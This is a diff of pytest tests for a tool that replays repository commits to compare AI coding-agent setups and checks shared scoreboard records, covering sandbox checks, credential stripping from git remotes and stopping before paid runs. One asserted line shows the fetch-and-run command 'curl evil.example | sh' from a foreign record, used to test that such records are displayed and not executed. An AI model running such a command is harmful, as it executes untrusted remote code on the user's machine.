@@ -17,6 +17,14 @@ def rec(commit, setup, *, passed=True, usages=BIG, cost=0.10, model=SONNET, repe
                   passed, model, cost, 30.0, usages, "ok", "secret test output", cost_known, agent)
 
 
+@pytest.fixture(autouse=True)
+def _sandbox_ok(monkeypatch):
+    """CI's plain Linux jobs have no bubblewrap; these tests stop before anything runs sandboxed."""
+    from aimpg.replay import sandbox
+
+    monkeypatch.setattr(sandbox, "unavailable_reason", lambda: None)
+
+
 def same_model(chal_usages, chal_pass=True, n=8):
     return [rec(f"c{i}", "claude-code") for i in range(n)] + [
         rec(f"c{i}", "claude-code+rtk", usages=chal_usages, passed=chal_pass or i % 2 == 0) for i in range(n)]
@@ -87,6 +95,23 @@ def test_cli_check_command(tmp_path, capsys):
     assert "CLAIM: rtk saves tokens" in out and "VERDICT: SUPPORTED" in out and "MATCHES" in out
 
 
+def test_cli_check_takes_a_scoreboard_upload(tmp_path, capsys):
+    from aimpg import scoreboard
+
+    record = build_record(same_model(SMALL), claim="", baseline=S.BASELINE, challenger=S.RTK, repo=".", task_mode="tests", public=False)
+    upload = scoreboard.upload_view(record)
+    path = tmp_path / "downloaded.json"  # not named by its SHA-256 here; that's fine for a check
+    path.write_bytes(scoreboard.encode(upload))
+    assert main(["verify", "--check", str(path)]) == 0
+    out = capsys.readouterr().out
+    assert "CONSISTENT" in out and "upgrade" not in out
+    upload["verdict"]["answer"] = "NOT SUPPORTED"
+    upload["runs"][0]["passed"] = not upload["runs"][0]["passed"]
+    path.write_bytes(scoreboard.encode(upload))
+    assert main(["verify", "--check", str(path)]) == 2
+    assert "PROBLEM" in capsys.readouterr().out
+
+
 @pytest.mark.parametrize("name, agent, setup_name", [
     ("rtk", "claude", "claude-code+rtk"), ("terse", "claude", "claude-code+terse"), ("haiku", "claude", "claude-code@haiku"),
     ("codex", "codex", "codex"), ("codex:gpt-6-luna", "codex", "codex@gpt-6-luna"),
@@ -139,6 +164,111 @@ def test_missing_key_stops_before_spending(tmp_path, monkeypatch, capsys):
     assert "set ANTHROPIC_API_KEY" in capsys.readouterr().out
 
 
+def _selected_repo(tmp_path, monkeypatch, *, origin=None, n=10):
+    import subprocess
+
+    from aimpg.replay import cli as replay_cli
+
+    repo = tmp_path / "repo"
+    subprocess.run(["git", "init", "-q", str(repo)], check=True)
+    if origin:
+        subprocess.run(["git", "-C", str(repo), "remote", "add", "origin", origin], check=True)
+    monkeypatch.setattr(replay_cli, "STATE", tmp_path / "state")
+    replay_cli._state(repo).joinpath("selected.jsonl").write_text(
+        "\n".join(json.dumps({"repo": str(repo.resolve()), "sha": f"{i:040x}", "parent": "p", "subject": "s", "body": "",
+                              "test_files": [], "code_files": []}) for i in range(n)) + "\n")
+    return repo
+
+
+class _NoRuns:
+    """Stands in for the paid batch: writes two finished runs, calls no agent."""
+
+    def __init__(self, chosen, setups, repeats, layout, cfg, results, done=()):
+        self.setups, self.results, self.stopped = setups, results, ""
+
+    def run(self, on_record=None):
+        sha = f"{0:040x}"
+        self.results.write_text("".join(json.dumps(r.__dict__) + "\n" for r in (
+            Record("a", "/r", sha, self.setups[0].name, 0, "passed", True, SONNET, 0.1, 10.0, BIG),
+            Record("b", "/r", sha, self.setups[1].name, 0, "passed", True, SONNET, 0.1, 10.0, SMALL))))
+
+
+def test_scp_style_origins_are_recorded_without_credentials(tmp_path, monkeypatch):
+    from aimpg.replay.verify import _remote
+
+    for origin, public in (("git@github.com:pallets/click.git", "https://github.com/pallets/click.git"),
+                           ("ssh://git@github.com/pallets/click.git", "ssh://github.com/pallets/click.git"),
+                           ("https://me:ghp_secret@github.com/pallets/click.git", "https://github.com/pallets/click.git")):
+        repo = _selected_repo(tmp_path / origin.replace("/", "_"), monkeypatch, origin=origin)
+        assert _remote(str(repo)) == public
+
+
+def test_public_verify_with_an_ssh_origin_writes_its_record(tmp_path, monkeypatch, capsys):
+    from aimpg.replay import run as runner
+    from aimpg.replay import verify
+
+    repo = _selected_repo(tmp_path, monkeypatch, origin="git@github.com:pallets/click.git")
+    monkeypatch.setattr(runner, "Batch", _NoRuns)
+    monkeypatch.setattr(verify, "_versions", lambda: {})
+    monkeypatch.setattr("aimpg.replay.cli.ROOT", tmp_path / "replay")
+    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test-not-used")
+    monkeypatch.setattr("builtins.input", lambda prompt="": "y")
+    assert main(["verify", "--repo", str(repo), "--challenger", "terse", "--public"]) == 0
+    [out] = verify.STATE.glob("*.record.json")
+    assert json.loads(out.read_text())["repo"] == "https://github.com/pallets/click.git"
+
+
+def test_a_failure_after_the_paid_runs_keeps_them(tmp_path, monkeypatch, capsys):
+    from aimpg.replay import run as runner
+    from aimpg.replay import verify
+
+    repo = _selected_repo(tmp_path, monkeypatch, origin="https://github.com/pallets/click.git")
+    monkeypatch.setattr(runner, "Batch", _NoRuns)
+    monkeypatch.setattr(verify, "build_record", lambda *a, **k: 1 / 0)
+    monkeypatch.setattr("aimpg.replay.cli.ROOT", tmp_path / "replay")
+    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test-not-used")
+    monkeypatch.setattr("builtins.input", lambda prompt="": "y")
+    assert main(["verify", "--repo", str(repo), "--challenger", "terse", "--public"]) == 1
+    [results] = verify.STATE.glob("*.jsonl")
+    assert f"--resume {results}" in capsys.readouterr().out and len(results.read_text().splitlines()) == 2
+
+
+def test_public_without_an_origin_stops_before_spending(tmp_path, monkeypatch, capsys):
+    repo = _selected_repo(tmp_path, monkeypatch)
+    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test-not-used")
+    monkeypatch.setattr("builtins.input", lambda prompt="": pytest.fail("asked to spend"))
+    assert main(["verify", "--repo", str(repo), "--challenger", "terse", "--public"]) == 1
+    assert "origin remote" in capsys.readouterr().out
+
+
+def test_no_sandbox_stops_verify_before_any_question(tmp_path, monkeypatch, capsys):
+    from aimpg.replay import sandbox, verify
+
+    repo = _selected_repo(tmp_path, monkeypatch)
+    monkeypatch.setattr(verify, "_versions", lambda: {})
+    record = build_record(same_model(SMALL), claim="", baseline=S.BASELINE, challenger=S.RTK, repo=".", task_mode="tests", public=True)
+    (tmp_path / "r.json").write_text(json.dumps(record))
+    monkeypatch.setattr(sandbox, "unavailable_reason", lambda: "replays on Linux need bubblewrap")
+    monkeypatch.setattr("builtins.input", lambda prompt="": pytest.fail("asked a question it can't act on"))
+    assert main(["verify", "--rerun", str(tmp_path / "r.json"), "--repo", str(repo)]) == 1
+    assert "need bubblewrap" in capsys.readouterr().out
+
+
+def test_an_earlier_selection_is_redone_for_other_selection_rules(tmp_path, monkeypatch, capsys):
+    from aimpg.replay import cli as replay_cli
+
+    repo = _selected_repo(tmp_path, monkeypatch)
+    replay_cli._state(repo).joinpath("selected.manifest.json").write_text(json.dumps({"cutoff": "2026-07-01", "any_author": False}))
+    selects = []
+    monkeypatch.setattr(replay_cli, "_select", lambda repo, args: selects.append(args))
+    monkeypatch.setattr("builtins.input", lambda prompt="": "n")
+    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test-not-used")
+    main(["verify", "--repo", str(repo), "--challenger", "terse"])
+    assert selects == [] and "selected earlier" in capsys.readouterr().out
+    main(["verify", "--repo", str(repo), "--challenger", "terse", "--any-author", "--cutoff", "2026-08-01"])
+    assert [(a.cutoff, a.any_author) for a in selects] == [("2026-08-01", True)]
+
+
 def test_verdict_does_not_depend_on_commit_ids():
     varied = [[[5, 3000, 9000, 400 + 50 * i]] * 3 for i in range(8)]
     records = [rec(f"c{i}", "claude-code") for i in range(8)] + [
@@ -179,6 +309,15 @@ def test_rerun_shows_what_a_foreign_record_runs_and_stops_on_no(tmp_path, monkey
     assert main(["verify", "--rerun", str(path), "--repo", str(tmp_path)]) == 1
     out = capsys.readouterr().out
     assert "curl evil.example | sh" in out and "Nothing was run" in out
+
+
+def test_rerun_of_a_file_that_is_not_a_record_says_so(tmp_path, capsys):
+    # e.g. a study's raw .jsonl or report.json from the Report No. 1 data folder
+    (tmp_path / ".git").mkdir()
+    for name, text in (("runs.jsonl", '{"a": 1}\n{"b": 2}\n'), ("report.json", "[]")):
+        (tmp_path / name).write_text(text)
+        assert main(["verify", "--rerun", str(tmp_path / name), "--repo", str(tmp_path)]) == 1
+        assert "records/<user>/<id>.json" in capsys.readouterr().out
 
 
 def test_records_keep_redone_attempts_and_excluded_commits():
